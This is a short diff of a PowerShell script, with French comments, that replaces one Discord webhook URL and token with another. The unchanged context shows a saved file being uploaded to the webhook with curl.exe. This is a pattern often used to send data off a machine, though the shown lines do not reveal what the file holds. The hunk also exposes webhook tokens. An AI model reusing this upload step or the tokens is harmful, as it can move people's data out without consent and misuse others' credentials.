@@ -179,7 +179,7 @@ Write-Host "Fichier sauvegarde: $filePath" -ForegroundColor Green
 #----------------------------------------------------------------------------------------------------
 # ENVOIE AU WEBHOOK DISCORD
 
-$hookurl = "https://discord.com/api/webhooks/1555535844650258512/6O0fSMEss7nXH5vIFFoDbLV-EpAXSx9QtjHPVmN6WbCESF6INDgxmmb5qBIy4FDJAf_W"
+$hookurl = "https://discord.com/api/webhooks/1555956404890640474/DIha82pc87inUnInTAKiD7g6OSKZYhQ_XMGgeIhrxbmzpRaJ53JR8RbfnqmFuc4RWYsI"
 
 try {
     curl.exe -F "file=@$filePath" $hookurl
